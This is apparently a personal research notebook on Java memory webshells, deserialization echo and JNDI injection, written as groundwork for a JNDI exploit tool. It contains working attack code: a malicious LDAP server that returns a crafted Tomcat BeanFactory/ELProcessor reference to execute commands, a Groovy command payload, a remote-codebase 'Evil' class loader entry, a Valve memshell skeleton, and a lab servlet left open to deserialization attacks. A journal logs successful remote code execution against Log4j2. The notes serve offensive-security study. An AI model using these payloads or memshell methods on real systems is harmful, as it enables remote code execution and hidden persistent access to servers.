---
title: Memshell study, JNDI inject memshell, JNDI exploit tool development
date: 2023-10-24
tags:
---
# Repo

[Spring memshell](https://github.com/PadishahIII/Spring-Memshell)



# Tomcat memshell
## Debug tomcat source code
Download source code and follow build steps from [here](https://tomcat.apache.org/tomcat-9.0-doc/building.html#Obtain_the_Tomcat_source_code).
What's important is that **you cannot debug web application and tomcat source code simultaneously**, because web application should be packaged into war and you should debug it in another IDEA window.
The current solution is: package the web application project into the `output/build/webapps` of  tomcat source code project, and configurate the VM option of tomcat source code project with `-Dcatalina.home=output/build`. As the result, you should only run debug of tomcat source code and package web application to update code, with Hotswap option on, it seems like you are debugging a single project.

## Tomcat data flow
### Valve, Filter, Servlet
After `Connector` parses Http request, control will pass to `Container`'s pipeline, begin at `org.apache.catalina.connector.CoyoteAdapter#service`:
```java
...
connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);
```
Pipeline consists of several `Valve`, by default, the data flow is: `StandardEngineValve`, `StandardHostValve`, `StandardContextValve`, `StandardWrapperValve`, and in `StandardWrapperValve#invoke`, walk through `FilterChain` and finally call `Servlet#service`.


## Tomcat memshell
### Valve memshell
To dynamically create malicious Valve, we should clear out the Valve calling order.
The entry falls at `org.apache.catalina.connector.CoyoteAdapter#service`:
```java
...
connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);
```
Then falls into `org.apache.catalina.core.StandardEngineValve#invoke`:
```java
Host host = request.getHost();
...
host.getPipeline().getFirst().invoke(request, response);
```
In `org.apache.catalina.core.StandardHostValve#invoke`:
```java
Context context = request.getContext();
...
context.getPipeline().getFirst().invoke(request, response);
```
In which `context` should be a `StandardContext`  object. Conclusively, we can use `StandardContext#addValve` to insert a malicious Valve. In addition, Valve should call next valve in the pipeline:
```java
public class MemshellValve extends ValveBase {
	@Override
	public void invoke(Request request, Response response) throws IOException, ServletException {
		...
		getNext().invoke(request, response);
}
```
After insert memshell Valve, `invoke` method will run at every single request, so you can execute command on every servlet of this context.

---

# Java Agent memshell
## Instrument 
Java Instrument package provide a way to add agents for a specific java method in a specific JVM. It's similar to AOP. The type of java agent includes `premain` agent and `agentmain` agent. The `premain` agent can only be loaded at JVM start, and cannot be loaded to a already running JVM. The `agentmain` agent is able to be loaded to a running JVM dynamically, which is suited for memshell.

## Inject Java Agent
To inject a java agent needs:
- A `ClassFileTransformer` class, in `transform` method, modify source code of target method
- A class(e.g. `AgentMain`) with `agentmain` method implemented, retransform target class to spark transformer
- Modify `MANIFEST.MF` of jar file to include `Agent-Class` option
- With a arbitrary code execution entry, `attach` target JVM and load agent jar

## Problems
### Cannot use `com.sun.tools.attach` package in JDK8
This package is supported on JDK11

### Cannot use `javassist` package on target server

> [!FAIL] Not Solved
> `NoClassDefFoundError` for `javassist` classes when loading agent.
> I intend to add jar file dynamically to ClassLoader but fail to find a way to obtain that.

---

# Deserialization Echo, inject memshell via deserialization vuls
We can use deserialization vulnerabilities to execute arbitrary code, but can not get the execution result directly. Now that our malicious code is executed in a servlet, it is possible to obtain the Request and Response object of current servlet. Then we can either write the command execution result to response or inject a memshell into the server.

All of the work relies on the fact that we can use `Thread.currentThread()` to get a `TaskThread` whose `group` member is a reference to the `ThreadGroup` it locates in, and we can access all threads in the current thread group. We can ensure that the Request and Response object must exist in a certain thread of current thread group. So here comes a tool named `java-object-searcher` that filters objects by some conditions in current thread group, as first introduced in this article[^2] and then this article[^3].

### Use java-object-searcher to find Echo class
The basic usage is presented [here](https://github.com/c0ny1/java-object-searcher). To better look into this tool, I have copied the source code to the web project. You can also import by jar file.
First, we need to prepare a tomcat server vulnerable to deserialize vulnerability, e.g. *CommonBeanutils1* in *ysoserial*. Start the server in debug mode and add a break point at the `readObject` line. The servlet is as following:
```java
@WebServlet("/deserialize")  
public class DeserializeServlet extends HttpServlet {
	protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {  
	    try {  
	        Base64.Decoder decoder = Base64.getDecoder();  
	        String dataStr = req.getParameter("data");  
	        if (dataStr != null) {  
	            byte[] data = decoder.decode(dataStr.toString());  
	            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);  
	            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
	  
	            Object obj = objectInputStream.readObject();  
	  
	            StringBuilder res = new StringBuilder();  
	            res.append(String.format("Get object: %s", obj.getClass().getName()));  
	  
	            resp.getWriter().println(res);  
	        } else {  
	            resp.getWriter().println("data is empty");  
	        }  
	    } catch (Exception e) {  
	        resp.getWriter().println("Exception:" + e.getClass().getName() + ":" + e);  
	    }  
	}
}
```
Send a post request with `data=(any base64 content)` in body. While intercepted at `readObject`, push *Alt+F8* in IDEA and evaluate the following code fragment:
```java
List<Keyword> keys = new ArrayList<>();  
keys.add(new Keyword.Builder().setField_type("Request").build());  
keys.add(new Keyword.Builder().setField_type("RequestInfo").build());  
keys.add(new Keyword.Builder().setField_type("RequestGroup").build());  
keys.add(new Keyword.Builder().setField_type("RequestGroupInfo").build());  
keys.add(new Keyword.Builder().setField_type("ServletRequest").build());  
  
SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(), keys);  
searcher.setIs_debug(false);  
searcher.setMax_search_depth(20);  
searcher.setReport_save_path("D:\\Files\\Java_WorkSpace\\Webapp-for-tomcat9\\webapp-for-tomcat9");  
searcher.searchObject();
```
After done without any exception, we can find the result in folder:
```
TargetObject = {org.apache.tomcat.util.threads.TaskThread}   
  ---> group = {java.lang.ThreadGroup}   
   ---> threads = {class [Ljava.lang.Thread;}   
    ---> [3] = {java.lang.Thread}   
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}   
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}   
        ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}   
         ---> global = {org.apache.coyote.RequestGroupInfo}

TargetObject = {org.apache.tomcat.util.threads.TaskThread}   
  ---> group = {java.lang.ThreadGroup}   
   ---> threads = {class [Ljava.lang.Thread;}   
    ---> [3] = {java.lang.Thread}   
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}   
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}   
        ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}   
         ---> global = {org.apache.coyote.RequestGroupInfo}   
          ---> processors = {java.util.ArrayList<org.apache.coyote.RequestInfo>}   
           ---> [0] = {org.apache.coyote.RequestInfo}
...

```
The `TargetObject` of each chain is the start point for searching. Every line presents a member of parent. And in the last row we can find the target class.
Next I will reproduce the first chain as above to get the echo from deserialization vul.

#TODO


---

# JNDI Injection Basic


### LDAP
#### Concepts
***Entry*** is a collection of information about an entity. Each *entry* consists of three primary components: a DN, a collection of attributes and a collection of object classes.

**DN**(Distinguished name) is comprised of RDNs(Relative DN). **RDN** is comprised of ***Attributes***. In RDN, attributes are separated by plus sign. In DN, RDNs are separated by comma. The order of RDNs specifies the position of the associated entry in the **DIT**(Directory information tree). The list of RDN grows to the left.
Example:
```
RDN1: uid=john.doe
RDN2: givenName=John+sn=Doe
DN1: uid=john.doe,ou=People,dc=example,dc=com
DN2: ou=People,dc=example,dc=com
(DN2 is the parent of DN1.)

```

***Schema*** is the configuration of LDAP server. LDAP bind requests should follow the conduct specified by the schema. When creating an `InMemoryDirectoryServer`, the schema should be loaded explicitly otherwise any `bind()` action would fail. Or we can set server's schema to null.

LDAP only supports storing objects in any type of `Serializable`, `Referencable` or `DirContext`. 

#### Start a LDAP server
```java
int port = 2389;  
InMemoryDirectoryServerConfig serverConfig = new InMemoryDirectoryServerConfig("dc=example,dc=com");  
serverConfig.setSchema(null);  
serverConfig.setListenerConfigs(new InMemoryListenerConfig(  
        "listen",  
        InetAddress.getByName("0.0.0.0"),  
        port,  
        ServerSocketFactory.getDefault(),  
        SocketFactory.getDefault(),  
        (SSLSocketFactory) SSLSocketFactory.getDefault()));  
  
InMemoryDirectoryServer ds = new InMemoryDirectoryServer(serverConfig);  
ds.startListening();
```

#### Store and request Serializable objects


> [!NOTE] restrictions
> The class of object in LDAP serializable entry must exist in client's class path.
> Exploitation by serializable entry only take effect along with client's serialization vulnerability.


How to bind a serializable object into LDAP server is shown as below. Actually, only `javaClassName` attribute is mandatory.
```java
public  class Flower implements Serializable {
...
}

BasicAttributes attributes = new BasicAttributes();  
attributes.put("javaClassName", Flower.class.getName());  
attributes.put("javaSerializedData", bytes);  
attributes.put("objectClass", "javaSerializedObject");

try {  
    ctx.bind("dc=example,dc=com", f, attributes);  
} catch (NameAlreadyBoundException e) {  
    System.out.println("Flower already exists, rebind...");  
    ctx.rebind("dc=example,dc=com", f, attributes);  
}
```

Request a serializable object:
```java
Object f2 = ctx.lookup("dc=example,dc=com");  
System.out.println(f2);
```

If the target class exists in client's class path, then the serialization process starts.

#### Referenceable objects, remote classloading via codebase

> [!NOTE] Restrictions
> The remote classloading functionality is only included in Oracle JDK. In OpenJDK, you will find there is even no source code about this functionality.
> After JDK8u191, JDK will check `trustURLCodebase` before requesting from codebase.
> The resolving codebase functionality is deprecated in JDK9 and deleted in JDK11.
> *(The code in this section are written with JDK7u21)*

Build a Referencable entry(combine with next section).
```java
Entry entry = new Entry(baseDN);  
entry.addAttribute("javaClassName", "xxx");  
entry.addAttribute("javaCodeBase", "http://127.0.0.1:8888/");  
entry.addAttribute("objectClass", "javaNamingReference");  
entry.addAttribute("javaFactory", Evil.class.getName());  
  
result.sendSearchEntry(entry);  
result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
```

When request the LDAP entry:
```java
ctx.lookup("ldap://0.0.0.0:2389/ref");
```
A http request will made to *codebase*, client will download and define the `Evil` class. Any static code block in `Evil` will be executed on client.


#### LDAP Interceptor
The `InMemoryOperationInterceptor` class can intercept the process either between receiving requests and reaching the LDAP server, or after processed by LDAP server and before sending result to client.
Its `processSearchResult()` method defines the action before replying to client. We can intercept all results from LDAP server and take easy to return a newly defined `Entry`.
Example:
```java
@Override  
public void processSearchResult(InMemoryInterceptedSearchResult result) {  
    String base = result.getRequest().getBaseDN();  
  
    System.out.println(String.format("Request: %s", base));  
  
    if (base.toLowerCase().startsWith("ser")) {  
        processSerializable(result);  
        return;    } else if (base.toLowerCase().startsWith("ref")) {  
        processReferencable(result);  
        return;    }  
  
    System.out.println(String.format("Request for %s fail", base));  
	result.sendSearchEntry(entry);
    result.setResult(new LDAPResult(2, ResultCode.NO_OPERATION));  
  
}
```



---

# JNDI Injection Bypass

> After JDK8u191, the remote resolving codebase functionality of LDAP and RMI is disabled by default. So we need to bypass this restriction.



## Bypass using `ObjectFactory`[^1] 
### Tomcat Bypass using `BeanFactory`

> [!NOTE] pre-requirements
> Tomcat < 8.5.79
> This vul is repaired in 8.5.79, changelog:
> *Disable the `forceString` option for the JNDI `BeanFactory` and replace it with an automatic search for an alternative setter with the same name that accepts a `String`. This is a security hardening measure. (markt)*

We can specify an arbitrary factory class in the `javaFactory` attribute. 
This class will be used to extract the read object from the attacker's controlled `Reference` object. It should exist in the target classpath, implement `ObjectFactory` and has at least one `getObjectInstance` method.
The `BeanFactory` class within Apache Tomcat Server contains a logic for bean creation by using reflection. The target class should have a public no-argument constructor and public setter with only one `String` parameter. In fact, `BeanFactory` contains some logic surrounding how we can specify an arbitrary setter name.
```java
RefAddr ra = ref.get("forceString");  
Map<String, Method> forced = new HashMap<>();  
String value;  
  
if (ra != null) {  
    value = (String)ra.getContent();  
    Class<?> paramTypes[] = new Class[1];  
    paramTypes[0] = String.class;  // only modified here
	...
	for (String param: value.split(",")) {  
	    param = param.trim();  
	    index = param.indexOf('=');  
	    if (index >= 0) {  
	        setterName = param.substring(index + 1).trim();  
	        param = param.substring(0, index).trim();  
	    } else {  
	        setterName = "set" +  
	                     param.substring(0, 1).toUpperCase(Locale.ENGLISH) +  
	                     param.substring(1);  
	    }  
	    try {  
	        forced.put(param,  
	                   beanClass.getMethod(setterName, paramTypes));  
	    } catch (NoSuchMethodException|SecurityException ex) {  
	        throw new NamingException  
	            ("Forced String setter " + setterName +  
	             " not found for property " + param);  
	    }
	}
```

Consider a "forceString" with content "x=eval", "eval" will become the setter name, the map `forced` will result in `"x": Method(xx.eval)`. 
Next, `BeanFactory` extracts all references and finally invoke the setter.
```java
Enumeration<RefAddr> e = ref.getAll();
while (e.hasMoreElements()) {
	ra = e.nextElement();  
	String propName = ra.getType(); 
	value = (String)ra.getContent();  
	Object[] valueArray = new Object[1];  
	Method method = forced.get(propName);
	if (method != null) {  
	    valueArray[0] = value;  
	    try {  
	        method.invoke(bean, valueArray);  
	    } catch (IllegalAccessException|  
	             IllegalArgumentException|  
	             InvocationTargetException ex) {  
	        throw new NamingException  
	            ("Forced String setter " + method.getName() +  
	             " threw exception for property " + propName);  
	    }  
	    continue;  
	}
}
```
So we can include a string reference to the evil reference with attribute type "x" and put EL expression in the content. As a result, the `propName` will be "x" and `valueArray` will contain our EL expression. 

We are writing our own malicious LDAP server (or RMI) that responds with a crafted `ResourceRef` object:
```java
String payloadTemplate = "{" +  
        "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +  
        ".newInstance().getEngineByName(\"JavaScript\")" +  
        ".eval(\"{replacement}\")" +  
        "}";
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",  
        true, "org.apache.naming.factory.BeanFactory", null);  
ref.add(new StringRefAddr("forceString", "x=eval"));
ref.add(new StringRefAddr("x", payloadTemplate.replace("{replacement}", "new java.lang.ProcessBuilder['(java.lang.String[])'](['calc.exe']).start()")));

Entry entry = new Entry();
e.addAttribute("javaClassName", "java.lang.String"); //could be any
e.addAttribute("javaSerializedData", Util.serialize(ref));

result.sendSearchEntry(e);
result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
```


### Bypass using Groovy
Use the same method as [[#Tomcat Bypass using `BeanFactory`|ELProcessor]], ELProcessor can be replaced by Groovy, but this require the target to include Groovy in classpath.
We can exploit by using the method `evaluate` within `groovy.lang.GroovyShell` to execute arbitrary Groovy shell code:
```java
['cmd','/C', 'calc.exe'].execute();
```

### Bypass using LDAP Serialized Object
We can use LDAP serialized object entry to contain malicious gadgets. If the client has the vulnerable class in classpath, we will perform a deserialization attack. There is no JDK version restriction on this bypass method.

---

# JNDI exploit tool
> *Imagine you have found a log4j2 deserializable  vulnerability of an API, you can make the victim server to request an arbitrary JNDI URI, you want to inject a memshell using this breach. *

## Structure and steps(take `JNDIExploit` project as example)
In general, a JNDI exploit tool can divide into three parts: 
- Choose the way to inject evil class:
	- By register LDAP `javaSerializedData` entry and directly upload serialized evil class
	- By LDAP `codebase`, remote requesting evil class file
	- Using `BeanFactory` vulnerability, load evil class bytes by `EL` expression
- Define evil class (namely, the memshell loader):
	- Memshell loader should load memshell byte code by reflectively call `defineClass` method of classloader in current context.
- Choose the type of memshell:
	- e.g. by Tomcat Filter/Servlet/Valve/Listener, or Spring Interceptor/Controller, etc.

### Using `BeanFactory` vul to inject memshell
Exploit `BeanFacotory`'s vul, we can execute arbitrary EL expression by `ELProcessor`, but only one EL sentence would be run. So we should pack the evil class loader into JavaScript and execute JS code by JavaScript engine.


---

# Conclusion
## Process of JNDI injection and Deserialization
JNDI injection covers the exploitation of deserialization. The following is the conclusion of how to inject memshell by using JNDI injection and deserialization vuls.
1. Deserialization
```
Kick-off: a vulnerable readObject()
	Sink: run arbitrary code by
		define a new class from byte array and construct new instance. e.g. TemplatesImpl
			inject memshell in static code block or constructor
				define memshell class from byte array
				obtain Request object 
				inject memshell into context

		
```

2. JNDI injection
```
Kick-off: a vulnerable lookup()
	Sink: 
		Serialzable: same as deserialization vul
		Referencable: 
			remote classloading
			bypass using BeanFactory:
				use script engine, e.g. ELProcessor, JavaScript, Groovy, BeanShell
				construct script:
					define an evil class from byte array
						inject memshell in static code block or constructor, e.g. TomcatMemshellTemplate1
							define memshell class from byte array
							obtain Request object 
							inject memshell into context
```



---

# Journal
## JNDIExploit functions test on Log4j2 vul
> *As for spring web server, those payload targeted to tomcat would lose efficiency*

> `TomcatBypass` use `BeanFactory` to execute payload
> `Basic` would remote request payload

- `TomcatBypass/SpringMemshell`: successfully rce
- `TomcatBypass/TomcatMemshell`: fail
- `TomcatBypass/GodzillaMemshell`: success
- `Basic/SpringMemshell`: fail
- `Deserilization/Jre8u20/SpringMemshell`: fail

## TODO
- [x] Reproduce Tomcat memshell, Filter/Listener/Valve
- [x] Explore Spring source code, reproduce Spring memshell
- [ ] Reproduce java agent memshell
- [x] Explore deserializable entry points: LDAP `codebase`, `javaSerializeData`, `BeanFactory` vul, common gadgets; Read source code of `ysoserial`, reproduce exploitation of gadgets
- [x] Explore methods to load payload's byte code, `ASM`, `ClassWriter`
- [x] Learn `Instrument` and `javassit`
- [ ] Explore `JNDI-Inject-Tool` and `JYso` tool.
- [ ] Research how to inject tomcat memshell via deserialization vul
	- [x] Failed to echo by dynamically generating evil class in `TomcatEcho`. Try loading the byte code of compiled evil class and modify `Gadgets.createTemplatesImpl`
	- [x] Echo header 
	- [ ] Inject memshell 
- [ ] Research agent memshell in `JNDIExploit`

# Reference


[^1]: [探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖](https://tttang.com/archive/1405/#toc_0x02-xxe-rce)

[^2]: [半自动化挖掘request实现多种中间件回显 | 回忆飘如雪](https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/)
[^3]: [Java反序列化回显学习之Tomcat通用回显 - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/200930.html)


